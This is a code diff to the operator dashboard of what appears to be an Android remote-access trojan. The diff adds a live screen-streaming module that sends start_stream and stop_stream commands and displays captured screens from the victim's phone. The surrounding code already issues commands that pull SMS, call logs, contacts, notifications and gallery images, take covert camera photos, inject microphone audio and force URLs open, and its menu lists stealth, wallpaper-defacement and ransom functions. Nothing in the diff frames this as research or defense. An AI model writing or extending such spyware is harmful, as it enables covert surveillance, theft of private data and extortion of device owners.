@@ -300,6 +300,10 @@
                 b.innerHTML = `<p style="color:var(--dim); margin-bottom:5px;">Target URL:</p><input id="ourl" value="https://google.com">`;
                 f.innerHTML = `<button class="action-btn" onclick="cmd('openurl '+document.getElementById('ourl').value)">FORCE OPEN</button>`;
                 return;
+            } else if(t === 'stream') {
+                b.innerHTML = `<div style="text-align:center; background:#000; padding:10px; border:1px solid #222;"><img id="scr-img" style="width:100%; max-width:400px; border:1px solid var(--primary);"><p id="scr-stat" style="color:var(--dim); margin-top:10px;">Waiting for payload...</p></div>`;
+                f.innerHTML = `<button class="action-btn" onclick="cmd('start_stream')">START MONITORING</button><button class="action-btn red" onclick="cmd('stop_stream')">STOP STREAM</button>`;
+                return;
             }
 
             const map = { sms:'getsms', calls:'getcalllogs', apps:'list_app', notifications:'getnotifications', takebackpic:'takebackpic', takefrontpic:'takefrontpic', contacts:'getcontacts', info:'deviceinfo', gallery:'gallery' };
@@ -387,6 +391,15 @@
             } else if(curMod === 'notifications') {
                 b.innerHTML = `<div class="table-responsive"><table><tr><th>Source</th><th>Content</th></tr>${d.notifications.map(n=>`<tr><td style="color:var(--primary); font-size:0.8rem;">${n.packageName}</td><td><b style="color:var(--text)">${n.title}</b><br><span style="color:var(--dim)">${n.text}</span></td></tr>`).join('')}</table></div>`;
                 f.innerHTML = `<button class="action-btn" style="width:100%" onclick="cmd('getnotifications')">REFRESH DATA</button>`;
+            } else if(curMod === 'stream') {
+                const img = document.getElementById('scr-img');
+                const stat = document.getElementById('scr-stat');
+                if(d.screen) {
+                    img.src = "data:image/jpeg;base64," + d.screen;
+                    stat.innerText = "[ STREAM ACTIVE - CAPTURING LIVE ]";
+                } else {
+                    stat.innerText = "[ AWAITING SCREEN DATA... ]";
+                }
             }
         }
 
@@ -432,6 +445,7 @@
                 {id:'apps', i:'fa-box-archive', l:'PACKAGES'}, {id:'flash', i:'fa-bolt', l:'FLASH'},
                 {id:'vibrate', i:'fa-wave-square', l:'VIBRATE'}, {id:'voice', i:'fa-microphone-lines', l:'MIC INJECT'},
                 {id:'takebackpic', i:'fa-camera', l:'CAM BACK'}, {id:'takefrontpic', i:'fa-video', l:'CAM FRONT'},
+                {id:'stream', i:'fa-display', l:'LIVE STREAM'},
                 {id:'stealth', i:'fa-eye-slash', l:'STEALTH', type:'stealth'},
                 {id:'setwallpaper', i:'fa-image', l:'DEFACE WP'}, {id:'toast', i:'fa-lock', l:'RANSOM'},
                 {id:'open_url', i:'fa-globe', l:'FORCE URL'}
